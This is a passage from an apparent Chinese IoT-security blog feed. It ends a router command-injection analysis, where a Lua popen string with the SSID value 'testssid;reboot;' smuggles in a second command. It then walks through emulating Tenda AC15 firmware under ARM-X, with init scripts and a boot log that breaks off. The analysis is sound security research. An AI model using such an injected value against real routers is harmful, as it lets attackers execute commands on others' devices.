class="line"><span class="string"># 4 拼接popen的cmd字符串</span></span><br><span class="line"><span class="string">opt = '</span>-f -A testssid;reboot;-P testwifipass-L testlogin-R testpass<span class="string">"</span></span><br><span class="line"><span class="string">_M.RUN_CENTRAL_CMD_SYNC = '/usr/bin/btsetup_central %s'</span></span><br><span class="line"><span class="string">io.popen(_M.RUN_CENTRAL_CMD_SYNC:format(option))</span></span><br><span class="line"><span class="string">io.popen('/usr/bin/btsetup_central %s':format('-f -A testssid;reboot;-P testwifipass-L testlogin-R testpass"</span>))</span><br><span class="line">io.popen(<span class="string">'/usr/bin/btsetup_central -f -A testssid;reboot;-P testwifipass-L testlogin-R testpass'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5 分号截断了命令，执行完btsetup_central又执行了用户可控的reboot命令</span></span><br><span class="line">/usr/bin/btsetup_central -f -A testssid;reboot;</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：并非将opt作为参数传入btsetup_central二进制中去执行，而直接在lua中popen触发，漏洞点在lua而非elf中</li>
</ul>
<blockquote>
<p>参考：<a href="https://puzzor.github.io/Linksys-Velop-configApSsid-command-injection-with-preauth" target="_blank" rel="noopener">https://puzzor.github.io/Linksys-Velop-configApSsid-command-injection-with-preauth</a></p>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>路由器,漏洞分析,命令注入</tag>
      </tags>
  </entry>
  <entry>
    <title>ARM-X对Tenda AC15的固件模拟</title>
    <url>/2021/10/12/iot/ARM-X%E5%AF%B9Tenda%20AC15%E7%9A%84%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="ARM-X对Tenda-AC15的固件模拟"><a href="#ARM-X对Tenda-AC15的固件模拟" class="headerlink" title="ARM-X对Tenda AC15的固件模拟"></a>ARM-X对Tenda AC15的固件模拟</h1><ul>
<li>固件：<a href="http://down.tendacn.com/uploadfile/AC15/US_AC15V1.0BR_V15.03.05.18_multi_TD01.zip" target="_blank" rel="noopener">http://down.tendacn.com/uploadfile/AC15/US_AC15V1.0BR_V15.03.05.18_multi_TD01.zip</a></li>
<li>binwalk -Me 提取</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">lxl@ubuntu:~/Desktop/tmp/17-armx/_US_AC15V1.0BR_V15.03.05.18_multi_TD01.bin.extracted/squashfs-root$ ll</span><br><span class="line">total 100</span><br><span class="line">drwxr-xr-x  15 lxl lxl  4096 May 10  2017 ./</span><br><span class="line">drwxr-xr-x 395 lxl lxl 40960 Feb  5 17:02 ../</span><br><span class="line">drwxr-xr-x   2 lxl lxl  4096 May 10  2017 bin/</span><br><span class="line">drwxr-xr-x   2 lxl lxl  4096 May 10  2017 cfg/</span><br><span class="line">drwxr-xr-x   2 lxl lxl  4096 May 10  2017 dev/</span><br><span class="line">lrwxrwxrwx   1 lxl lxl     8 May 10  2017 etc -&gt; /var/etc</span><br><span class="line">drwxr-xr-x   8 lxl lxl  4096 May 10  2017 etc_ro/</span><br><span class="line">lrwxrwxrwx   1 lxl lxl     9 May 10  2017 home -&gt; /var/home</span><br><span class="line">lrwxrwxrwx   1 lxl lxl    11 May 10  2017 init -&gt; bin/busybox*</span><br><span class="line">drwxr-xr-x   3 lxl lxl  4096 May 10  2017 lib/</span><br><span class="line">drwxr-xr-x   2 lxl lxl  4096 May 10  2017 mnt/</span><br><span class="line">drwxr-xr-x   2 lxl lxl  4096 May 10  2017 proc/</span><br><span class="line">lrwxrwxrwx   1 lxl lxl     9 May 10  2017 root -&gt; /var/root</span><br><span class="line">drwxr-xr-x   2 lxl lxl  4096 May 10  2017 sbin/</span><br><span class="line">drwxr-xr-x   2 lxl lxl  4096 May 10  2017 sys/</span><br><span class="line">drwxr-xr-x   2 lxl lxl  4096 May 10  2017 tmp/</span><br><span class="line">drwxr-xr-x   6 lxl lxl  4096 May 10  2017 usr/</span><br><span class="line">drwxr-xr-x   6 lxl lxl  4096 May 10  2017 var/</span><br><span class="line">lrwxrwxrwx   1 lxl lxl    11 May 10  2017 webroot -&gt; var/webroot/</span><br><span class="line">drwxr-xr-x   8 lxl lxl  4096 May 10  2017 webroot_ro/</span><br></pre></td></tr></table></figure>
<ul>
<li>获取内核版本</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># binwalk看大概信息，5C被压缩数据</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp/17-armx$ binwalk US_AC15V1.0BR_V15.03.05.18_multi_TD01.bin </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">64            0x40            TRX firmware header, little endian, image size: 10559488 bytes, CRC32: 0xFA817870, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x1C9CD4, rootfs offset: 0x0</span><br><span class="line">92            0x5C            LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 4585280 bytes</span><br><span class="line">1875220       0x1C9D14        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 8680744 bytes, 926 inodes, blocksize: 131072 bytes, created: 2017-05-10 14:10:50</span><br><span class="line"></span><br><span class="line"><span class="comment"># 看5C中敏感字符串</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp/17-armx$ strings _US_AC15V1.0BR_V15.03.05.18_multi_TD01.bin.extracted/5C &gt; str.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如下</span></span><br><span class="line">root=/dev/mtdblock2 console=ttyS0,115200 init=init earlyprintk debug</span><br><span class="line">Linux version 2.6.36.4brcmarm (root@linux-bkb8) (gcc version 4.5.3 (Buildroot 2012.02) ) <span class="comment">#1 SMP PREEMPT Wed May 10 21:54:27 CST 2017</span></span><br><span class="line">2.6.36.4brcmarm SMP preempt mod_unload modversions ARMv7</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># "root=/dev/mtdblock2 console=ttyS0,115200 init=init earlyprintk debug"中init=init，init就是sbin/init</span></span><br><span class="line"><span class="comment"># init检查inittab中命令并依次调用</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp/17-armx/_US_AC15V1.0BR_V15.03.05.18_multi_TD01.bin.extracted/squashfs-root$ cat etc_ro/inittab </span><br><span class="line">::sysinit:/etc_ro/init.d/rcS</span><br><span class="line">ttyS0::respawn:/sbin/sulogin</span><br><span class="line">::ctrlaltdel:/bin/umount -a -r</span><br><span class="line">::shutdown:/usr/sbin/wl radio off</span><br><span class="line">::shutdown:/usr/sbin/wl -i eth2 radio off</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">lxl@ubuntu:~/Desktop/tmp/17-armx/_US_AC15V1.0BR_V15.03.05.18_multi_TD01.bin.extracted/squashfs-root$ cat etc_ro/init.d/rcS</span><br><span class="line"><span class="meta">#! /bin/sh</span></span><br><span class="line"></span><br><span class="line">PATH=/sbin:/bin:/usr/sbin:/usr/bin/</span><br><span class="line"><span class="built_in">export</span> PATH</span><br><span class="line"></span><br><span class="line">mount -t ramfs none /var/ <span class="comment"># 将ramfs挂载</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mkdir -p /var/etc</span><br><span class="line">mkdir -p /var/media</span><br><span class="line">mkdir -p /var/webroot</span><br><span class="line">mkdir -p /var/etc/iproute</span><br><span class="line">mkdir -p /var/run</span><br><span class="line">cp -rf /etc_ro/* /etc/<span class="comment"># 复制etc</span></span><br><span class="line">cp -rf /webroot_ro/* /webroot/<span class="comment"># 复制web目录</span></span><br><span class="line">mkdir -p /var/etc/upan</span><br><span class="line">mount -a</span><br><span class="line"></span><br><span class="line">mount -t ramfs /dev</span><br><span class="line">mkdir /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line">mount -t tmpfs none /var/etc/upan -o size=2M</span><br><span class="line">mdev -s</span><br><span class="line">mkdir /var/run</span><br><span class="line"><span class="comment">#mount -t jffs2 /dev/mtdblock7 /cfg</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'/sbin/mdev'</span> &gt; /proc/sys/kernel/hotplug</span><br><span class="line"><span class="comment">#echo 'sd[a-z][0-9] 0:0 0660 @/usr/sbin/autoUsb.sh $MDEV' &gt;&gt; /etc/mdev.conf</span></span><br><span class="line"><span class="comment">#echo 'sd[a-z] 0:0 0660 $/usr/sbin/DelUsb.sh $MDEV' &gt;&gt; /etc/mdev.conf</span></span><br><span class="line"><span class="comment">#echo 'lp[0-9] 0:0 0660 */usr/sbin/IppPrint.sh'&gt;&gt; /etc/mdev.conf</span></span><br><span class="line"><span class="comment">#wds rule start</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'wds*.* 0:0 0660 */etc/wds.sh $ACTION $INTERFACE'</span> &gt; /etc/mdev.conf</span><br><span class="line"><span class="comment">#wsd rule end</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'sd[a-z][0-9] 0:0 0660 @/usr/sbin/usb_up.sh $MDEV $DEVPATH'</span> &gt;&gt; /etc/mdev.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'-sd[a-z] 0:0 0660 $/usr/sbin/usb_down.sh $MDEV $DEVPATH'</span>&gt;&gt; /etc/mdev.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'sd[a-z] 0:0 0660 @/usr/sbin/usb_up.sh $MDEV $DEVPATH'</span>&gt;&gt; /etc/mdev.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'.* 0:0 0660 */usr/sbin/IppPrint.sh $ACTION $INTERFACE'</span>&gt;&gt; /etc/mdev.conf</span><br><span class="line"><span class="comment">#echo '115.159.183.96 cloud.tenda.com.cn' &gt;&gt; /etc/hosts</span></span><br><span class="line">mkdir -p /var/ppp</span><br><span class="line">insmod /lib/modules/fastnat.ko </span><br><span class="line">insmod /lib/modules/bm.ko</span><br><span class="line"><span class="comment">#insmod /lib/modules/ai.ko </span></span><br><span class="line">insmod /lib/modules/mac_filter.ko </span><br><span class="line"><span class="comment">#insmod /lib/modules/ip_mac_bind.ko</span></span><br><span class="line">insmod /lib/modules/privilege_ip.ko</span><br><span class="line">insmod /lib/modules/qos.ko</span><br><span class="line">insmod /lib/modules/url_filter.ko</span><br><span class="line">insmod /lib/modules/loadbalance.ko</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"0 0 0 0"</span>&gt;/proc/sys/kernel/printk</span><br><span class="line"><span class="comment">#insmod /lib/modules/app_filter.ko</span></span><br><span class="line"><span class="comment">#insmod /lib/modules/port_filter.ko</span></span><br><span class="line"><span class="comment">#insmod /lib/modules/arp_fence.ko</span></span><br><span class="line"><span class="comment">#insmod /lib/modules/ddos_ip_fence.ko</span></span><br><span class="line">insmod /lib/modules/jnl.ko</span><br><span class="line">insmod /lib/modules/ufsd.ko</span><br><span class="line">insmod /lib/modules/fastnat_configure.ko</span><br><span class="line">chmod +x /etc/mdev.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动如下的守护进程</span></span><br><span class="line">cfmd &amp;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">''</span> &gt; /proc/sys/kernel/hotplug</span><br><span class="line">udevd &amp;</span><br><span class="line">logserver &amp;</span><br><span class="line"></span><br><span class="line">tendaupload &amp;</span><br><span class="line"><span class="keyword">if</span> [ -e /etc/nginx/conf/nginx_init.sh ]; <span class="keyword">then</span></span><br><span class="line">	sh /etc/nginx/conf/nginx_init.sh</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">moniter &amp;</span><br><span class="line">telnetd &amp;</span><br></pre></td></tr></table></figure>
<ul>
<li>启动顺序：init、inittab、rcS、各种守护进程</li>
</ul>
<p><img src="/Users/lxl/Library/Application Support/typora-user-images/image-20210205172956654.png" alt="image-20210205172956654" style="zoom:50%;"></p>
<ul>
<li>创建armx新设备</li>
</ul>
<p><img src="/Users/lxl/Library/Application Support/typora-user-images/image-20210205173147354.png" alt="image-20210205173147354"></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建相应目录</span></span><br><span class="line">armx:~$ <span class="built_in">cd</span> /armx</span><br><span class="line">armx:/armx$ cp -r template/ <span class="built_in">test</span>-tenda</span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择内核</span></span><br><span class="line"><span class="comment"># 如上得到字符串“Linux version 2.6.36.4“可知内核版本</span></span><br><span class="line"><span class="comment"># armx中已有5个，考虑到向后兼容性，选择2.6.39.4</span></span><br><span class="line">armx:/armx/<span class="built_in">test</span>-tenda$ ls kernel/</span><br><span class="line">zImage-2.6.28-versatile-nothumb</span><br><span class="line">zImage-2.6.29.6-versatile</span><br><span class="line">zImage-2.6.31-versatile-nothumb</span><br><span class="line">zImage-2.6.31.14-realview-rv130-nothumb</span><br><span class="line">zImage-2.6.39.4-vexpress</span><br><span class="line">armx:/armx/<span class="built_in">test</span>-tenda$ </span><br><span class="line"></span><br><span class="line"><span class="comment"># 将文件系统复制到rootfs下</span></span><br><span class="line">armx:/armx/<span class="built_in">test</span>-tenda$ ls rootfs/</span><br><span class="line">squashfs-root</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始的config</span></span><br><span class="line">armx:/armx/<span class="built_in">test</span>-tenda$ cat config </span><br><span class="line"><span class="comment"># Sample device configuration file</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">id=MYNEWDEVICE</span><br><span class="line">nvram=nvram.ini</span><br><span class="line">rootfs=rootfs</span><br><span class="line">randomize_va_space=0</span><br><span class="line"><span class="comment">#ld_preload=preload</span></span><br><span class="line">initcommands=<span class="string">"/etc/init.d/rcS;/bin/sh"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改后的config文件</span></span><br><span class="line"><span class="comment"># Sample device configuration file</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">id=<span class="built_in">test</span>-tenda</span><br><span class="line">nvram=nvram.ini</span><br><span class="line">rootfs=rootfs/squashfs-root</span><br><span class="line">randomize_va_space=0<span class="comment"># ASLR</span></span><br><span class="line"><span class="comment">#ld_preload=preload</span></span><br><span class="line">initcommands=<span class="string">"/etc_ro/init.d/rcS;/bin/sh"</span><span class="comment"># 启动指令，最后要开shell，/bin/sh</span></span><br><span class="line">initpath=/etc_ro/armxinit<span class="comment"># armx将启动文件放在哪，etc是链接文件，故。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># nvram配置目前未知，需要运行起来看，缺什么补什么</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 新增设备记录，armx/devices</span></span><br><span class="line"><span class="comment"># test-tenda,qemu-system-arm-4.1.0,vexpress-a9,,,256M,zImage-2.6.39.4-vexpress,VEXPRESS2,just a test for tenda</span></span><br><span class="line"><span class="built_in">test</span>-tenda,<span class="comment"># id</span></span><br><span class="line">qemu-system-arm-4.1.0,<span class="comment"># qemu-binary</span></span><br><span class="line">vexpress-a9,<span class="comment"># machine type</span></span><br><span class="line">,<span class="comment">#cpu-type</span></span><br><span class="line">,<span class="comment">#dtb</span></span><br><span class="line">256M,<span class="comment">#memory</span></span><br><span class="line">zImage-2.6.39.4-vexpress,<span class="comment">#kernel-image</span></span><br><span class="line">VEXPRESS2,<span class="comment">#qemuopts</span></span><br><span class="line">Tenda AC15 Wi-Fi Router<span class="comment">#description</span></span><br></pre></td></tr></table></figure>
<ul>
<li>尝试启动（第一次）</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动、console后按回车、输入login信息root、选项1-start</span></span><br><span class="line">Starting just a <span class="built_in">test</span> <span class="keyword">for</span> tenda</span><br><span class="line">Loading nvram from nvram.ini</span><br><span class="line">key1=<span class="string">'value1'</span></span><br><span class="line">Can<span class="string">'t open </span></span><br><span class="line"><span class="string">nv_get_config_data: Can'</span>t get config data</span><br><span class="line">key2=<span class="string">'value2'</span></span><br><span class="line">key3=<span class="string">'value3'</span></span><br><span class="line">key4=<span class="string">'value4'</span></span><br><span class="line">key5=<span class="string">'value5'</span></span><br><span class="line">key6=<span class="string">'value6'</span></span><br><span class="line">key7=<span class="string">'value7'</span></span><br><span class="line">key8=<span class="string">'value8'</span></span><br><span class="line">key9=<span class="string">'value9'</span></span><br><span class="line">key10=<span class="string">'value10'</span></span><br><span class="line">&gt;&gt;&gt; Starting <span class="built_in">test</span>-tenda</span><br><span class="line">[+] chroot /armx/<span class="built_in">test</span>-tenda/rootfs/squashfs-root /.armx/armxinit</span><br><span class="line">mkdir: can<span class="string">'t create directory '</span>/var/run<span class="string">': File exists</span></span><br><span class="line"><span class="string">fastnat: version magic '</span>2.6.36.4brcmarm SMP preempt mod_unload modversions ARMv7 <span class="string">' should be '</span>2.6.39.4-armexploitlab-therealsaumil SMP mod_unload ARMv7 <span class="string">'</span></span><br><span class="line"><span class="string">insmod: can'</span>t insert <span class="string">'/lib/modules/fastnat.ko'</span>: invalid module format</span><br><span class="line">bm: version magic <span class="string">'2.6.36.4brcmarm SMP preempt mod_unload modversions ARMv7 '</span> should be <span class="string">'2.6.39.4-armexploitlab-therealsaumil SMP mod_unload ARMv7 '</span></span><br><span class="line">insmod: can<span class="string">'t insert '</span>/lib/modules/bm.ko<span class="string">': invalid module format</span></span><br><span class="line"><span class="string">mac_filter: version magic '</span>2.6.36.4brcmarm SMP preempt mod_unload modversions ARMv7 <span class="string">' should be '</span>2.6.39.4-armexploitlab-therealsaumil SMP mod_unload ARMv7 <span class="string">'</span></span><br><span class="line"><span class="string">insmod: can'</span>t insert <span class="string">'/lib/modules/mac_filter.ko'</span>: invalid module format</span><br><span class="line">privilege_ip: version magic <span class="string">'2.6.36.4brcmarm SMP preempt mod_unload modversions ARMv7 '</span> should be <span class="string">'2.6.39.4-armexploitlab-therealsaumil SMP mod_unload ARMv7 '</span></span><br><span class="line">insmod: can<span class="string">'t insert '</span>/lib/modules/privilege_ip.ko<span class="string">': invalid module format</span></span><br><span class="line"><span class="string">qos: version magic '</span>2.6.36.4brcmarm SMP preempt mod_unload modversions ARMv7 <span class="string">' should be '</span>2.6.39.4-armexploitlab-therealsaumil SMP mod_unload ARMv7 <span class="string">'</span></span><br><span class="line"><span class="string">insmod: can'</span>t insert <span class="string">'/lib/modules/qos.ko'</span>: invalid module format</span><br><span class="line">url_filter: version magic <span class="string">'2.6.36.4brcmarm SMP preempt mod_unload modversions ARMv7 '</span> should be <span class="string">'2.6.39.4-armexploitlab-therealsaumil SMP mod_unload ARMv7 '</span></span><br><span class="line">insmod: can<span class="string">'t insert '</span>/lib/modules/url_filter.ko<span class="string">': invalid module format</span></span><br><span class="line"><span class="string">loadbalance: version magic '</span>2.6.36.4brcmarm SMP preempt mod_unload modversions ARMv7 <span class="string">' should be '</span>2.6.39.4-armexploitlab-therealsaumil SMP mod_unload ARMv7 <span class="string">'</span></span><br><span class="line"><span class="string">insmod: can'</span>t insert <span class="string">'/lib/modules/loadbalance.ko'</span>: invalid module format</span><br><span class="line">insmod: can<span class="string">'t insert '</span>/lib/modules/jnl.ko<span class="string">': invalid module format</span></span><br><span class="line"><span class="string">insmod: can'</span>t insert <span class="string">'/lib/modules/ufsd.ko'</span>: invalid module format</span><br><span class="line">insmod: can<span class="string">'t insert '</span>/lib/modules/fastnat_configure.ko<span class="string">': invalid module format</span></span><br><span class="line"><span class="string">init_core_dump 1816: rlim_cur = 0, rlim_max = -1</span></span><br><span class="line"><span class="string">init_core_dump 1825: open core dump success</span></span><br><span class="line"><span class="string">init_core_dump 1834: rlim_cur = 5242880, rlim_max = 5242880</span></span><br><span class="line"><span class="string">func:InitCfm begin load_mib....</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">######## STARTING PROGRAM #########</span></span><br><span class="line"><span class="string">Could not open mtd device 2</span></span><br><span class="line"><span class="string">[get_mtd_size] Can'</span>t open file:CFM</span><br><span class="line">[get_mtd_size] Can<span class="string">'t open file:CFM_BACKUP</span></span><br><span class="line"><span class="string">malloc buf failed</span></span><br><span class="line"><span class="string">load mib failed.</span></span><br><span class="line"><span class="string">flash_to_file:open Policy failed.</span></span><br><span class="line"><span class="string">going to rewrite flash...</span></span><br><span class="line"><span class="string">open Policy failed.</span></span><br><span class="line"><span class="string">rewrite flash ok...</span></span><br><span class="line"><span class="string">/dev/nvram: No such device</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">###########################################################</span></span><br><span class="line"><span class="string">###nvram partition is destory, restore by default and reboot##</span></span><br><span class="line"><span class="string">###########################################################</span></span><br><span class="line"><span class="string">Could not open mtd device 1</span></span><br><span class="line"><span class="string">envram_init: read flash error</span></span><br><span class="line"><span class="string">/dev/nvram: No such device</span></span><br><span class="line"><span class="string">load nvram from /webroot/nvram_default.cfg...</span></span><br><span class="line"><span class="string">/dev/nvram: No such device</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">/dev/nvram: No such device</span></span><br><span class="line"><span class="string">left wan[0]:0</span></span><br><span class="line"><span class="string">left lan[0]:1</span></span><br><span class="line"><span class="string">left lan[1]:2</span></span><br><span class="line"><span class="string">left lan[2]:3</span></span><br><span class="line"><span class="string">left lan[3]:4</span></span><br><span class="line"><span class="string">vlan_array[0]: value 1  index_num 1 name  cpu_port 0index[0] 0  index[1] 0  index[2] 0  index[3] 0  index[4] 0  </span></span><br><span class="line"><span class="string">vlan_array[1]: value 0  index_num 4 name  cpu_port 0index[0] 1  index[1] 2  index[2] 3  index[3] 4  index[4] 0  </span></span><br><span class="line"><span class="string">vlan_array[2]: value -2  index_num 0 name  cpu_port 0index[0] 0  index[1] 0  index[2] 0  index[3] 0  index[4] 0  </span></span><br><span class="line"><span class="string">vlan_array[3]: value -2  index_num 0 name  cpu_port 0index[0] 0  index[1] 0  index[2] 0  index[3] 0  index[4] 0  </span></span><br><span class="line"><span class="string">vlan_array[4]: value -2  index_num 0 name  cpu_port 0index[0] 0  index[1] 0  index[2] 0  index[3] 0  index[4] 0  </span></span><br><span class="line"><span class="string">nvram unset vlan1ports</span></span><br><span class="line"><span class="string">/dev/nvram: No such device</span></span><br><span class="line"><span class="string">nvram unset vlan2ports</span></span><br><span class="line"><span class="string">/dev/nvram: No such file or directory</span></span><br><span class="line"><span class="string">nvram unset vlan3ports</span></span><br><span class="line"><span class="string">/dev/nvram: No such file or directory</span></span><br><span class="line"><span class="string">nvram unset vlan4ports</span></span><br><span class="line"><span class="string">/dev/nvram: No such file or directory</span></span><br><span class="line"><span class="string">nvram unset vlan5ports</span></span><br><span class="line"><span class="string">/dev/nvram: No such file or directory</span></span><br><span class="line"><span class="string">nvram set vlan2ports="0  5"</span></span><br><span class="line"><span class="string">/dev/nvram: No such file or directory</span></span><br><span class="line"><span class="string">nvram set vlan1ports="1  2  3  4  5*"</span></span><br><span class="line"><span class="string">/dev/nvram: No such file or directory</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">/dev/nvram: No such file or directory</span></span><br><span class="line"><span class="string">The system is going down NOW!irectory</span></span><br><span class="line"><span class="string">Terminated</span></span><br><span class="line"><span class="string">Sent SIGTERM to all processes</span></span><br><span class="line"><span class="string">Sent SIGKILL to all processes</span></span><br><span class="line"><span class="string">Requesting system reboot</span></span><br><span class="line"><span class="string">Uncompressing Linux... done, booting the kernel.</span></span><br><span class="line"><span class="string">Initializing cgroup subsys cpuset</span></span><br><span class="line"><span class="string">Linux version 2.6.39.4-armexploitlab-therealsaumil (saumil@saraswati) (gcc version 4.4.0 (Faraday C/C++ Compiler Release 20100325) ) #30 SMP Wed May 27 22:02:39 IST 2020</span></span><br><span class="line"><span class="string">CPU: ARMv7 Processor [410fc090] revision 0 (ARMv7), cr=10c53c7f</span></span><br><span class="line"><span class="string">CPU: VIPT nonaliasing data cache, VIPT nonaliasing instruction cache</span></span><br><span class="line"><span class="string">Machine: ARM-Versatile Express</span></span><br><span class="line"><span class="string">Memory policy: ECC disabled, Data cache writealloc</span></span><br><span class="line"><span class="string">sched_clock: 32 bits at 24MHz, resolution 41ns, wraps every 178956ms</span></span><br><span class="line"><span class="string">PERCPU: Embedded 7 pages/cpu @c075a000 s7232 r8192 d13248 u32768</span></span><br><span class="line"><span class="string">Built 1 zonelists in Zone order, mobility grouping on.  Total pages: 65024</span></span><br><span class="line"><span class="string">Kernel command line: pty.legacy_count=16 console=ttyAMA0 rw root=/dev/mmcblk0 rootwait rootfstype=ext2 ARMX=test-tenda</span></span><br><span class="line"><span class="string">PID hash table entries: 1024 (order: 0, 4096 bytes)</span></span><br><span class="line"><span class="string">Dentry cache hash table entries: 32768 (order: 5, 131072 bytes)</span></span><br><span class="line"><span class="string">Inode-cache hash table entries: 16384 (order: 4, 65536 bytes)</span></span><br><span class="line"><span class="string">Memory: 256MB = 256MB total</span></span><br><span class="line"><span class="string">Memory: 254380k/254380k available, 7764k reserved, 0K highmem</span></span><br><span class="line"><span class="string">Virtual kernel memory layout:</span></span><br><span class="line"><span class="string">    vector  : 0xffff0000 - 0xffff1000   (   4 kB)</span></span><br><span class="line"><span class="string">    fixmap  : 0xfff00000 - 0xfffe0000   ( 896 kB)</span></span><br><span class="line"><span class="string">    DMA     : 0xffc00000 - 0xffe00000   (   2 MB)</span></span><br><span class="line"><span class="string">    vmalloc : 0xd0800000 - 0xf8000000   ( 632 MB)</span></span><br><span class="line"><span class="string">    lowmem  : 0xc0000000 - 0xd0000000   ( 256 MB)</span></span><br><span class="line"><span class="string">    pkmap   : 0xbfe00000 - 0xc0000000   (   2 MB)</span></span><br><span class="line"><span class="string">    modules : 0xbf000000 - 0xbfe00000   (  14 MB)</span></span><br><span class="line"><span class="string">      .init : 0xc0008000 - 0xc003a000   ( 200 kB)</span></span><br><span class="line"><span class="string">      .text : 0xc003a000 - 0xc050865c   (4922 kB)</span></span><br><span class="line"><span class="string">      .data : 0xc050a000 - 0xc05314a0   ( 158 kB)</span></span><br><span class="line"><span class="string">SLUB: Genslabs=13, HWalign=32, Order=0-3, MinObjects=0, CPUs=1, Nodes=1</span></span><br><span class="line"><span class="string">Hierarchical RCU implementation.</span></span><br><span class="line"><span class="string">	RCU-based detection of stalled CPUs is disabled.</span></span><br><span class="line"><span class="string">NR_IRQS:128</span></span><br><span class="line"><span class="string">Console: colour dummy device 80x30</span></span><br><span class="line"><span class="string">Calibrating delay loop... 892.92 BogoMIPS (lpj=4464640)</span></span><br><span class="line"><span class="string">pid_max: default: 32768 minimum: 301</span></span><br><span class="line"><span class="string">Mount-cache hash table entries: 512</span></span><br><span class="line"><span class="string">CPU: Testing write buffer coherency: ok</span></span><br><span class="line"><span class="string">hw perfevents: enabled with ARMv7 Cortex-A9 PMU driver, 5 counters available</span></span><br><span class="line"><span class="string">Brought up 1 CPUs</span></span><br><span class="line"><span class="string">SMP: Total of 1 processors activated (892.92 BogoMIPS).</span></span><br><span class="line"><span class="string">NET: Registered protocol family 16</span></span><br><span class="line"><span class="string">L310 cache controller enabled</span></span><br><span class="line"><span class="string">l2x0: 8 ways, CACHE_ID 0x410000c8, AUX_CTRL 0x02420000, Cache size: 131072 B</span></span><br><span class="line"><span class="string">hw-breakpoint: debug architecture 0x4 unsupported.</span></span><br><span class="line"><span class="string">Serial: AMBA PL011 UART driver</span></span><br><span class="line"><span class="string">mb:uart0: ttyAMA0 at MMIO 0x10009000 (irq = 37) is a PL011 rev1</span></span><br><span class="line"><span class="string">console [ttyAMA0] enabled</span></span><br><span class="line"><span class="string">mb:uart1: ttyAMA1 at MMIO 0x1000a000 (irq = 38) is a PL011 rev1</span></span><br><span class="line"><span class="string">mb:uart2: ttyAMA2 at MMIO 0x1000b000 (irq = 39) is a PL011 rev1</span></span><br><span class="line"><span class="string">mb:uart3: ttyAMA3 at MMIO 0x1000c000 (irq = 40) is a PL011 rev1</span></span><br><span class="line"><span class="string">bio: create slab &lt;bio-0&gt; at 0</span></span><br><span class="line"><span class="string">SCSI subsystem initialized</span></span><br><span class="line"><span class="string">usbcore: registered new interface driver usbfs</span></span><br><span class="line"><span class="string">usbcore: registered new interface driver hub</span></span><br><span class="line"><span class="string">usbcore: registered new device driver usb</span></span><br><span class="line"><span class="string">Switching to clocksource timer3</span></span><br><span class="line"><span class="string">Switched to NOHz mode on CPU #0</span></span><br><span class="line"><span class="string">NET: Registered protocol family 2</span></span><br><span class="line"><span class="string">IP route cache hash table entries: 2048 (order: 1, 8192 bytes)</span></span><br><span class="line"><span class="string">TCP established hash table entries: 8192 (order: 4, 65536 bytes)</span></span><br><span class="line"><span class="string">TCP bind hash table entries: 8192 (order: 4, 65536 bytes)</span></span><br><span class="line"><span class="string">TCP: Hash tables configured (established 8192 bind 8192)</span></span><br><span class="line"><span class="string">TCP reno registered</span></span><br><span class="line"><span class="string">UDP hash table entries: 128 (order: 0, 4096 bytes)</span></span><br><span class="line"><span class="string">UDP-Lite hash table entries: 128 (order: 0, 4096 bytes)</span></span><br><span class="line"><span class="string">NET: Registered protocol family 1</span></span><br><span class="line"><span class="string">RPC: Registered udp transport module.</span></span><br><span class="line"><span class="string">RPC: Registered tcp transport module.</span></span><br><span class="line"><span class="string">RPC: Registered tcp NFSv4.1 backchannel transport module.</span></span><br><span class="line"><span class="string">PMU: registered new PMU device of type 0</span></span><br><span class="line"><span class="string">squashfs: version 4.0 (2009/01/31) Phillip Lougher</span></span><br><span class="line"><span class="string">JFFS2 version 2.2. (NAND) © 2001-2006 Red Hat, Inc.</span></span><br><span class="line"><span class="string">msgmni has been set to 496</span></span><br><span class="line"><span class="string">io scheduler noop registered (default)</span></span><br><span class="line"><span class="string">clcd-pl11x 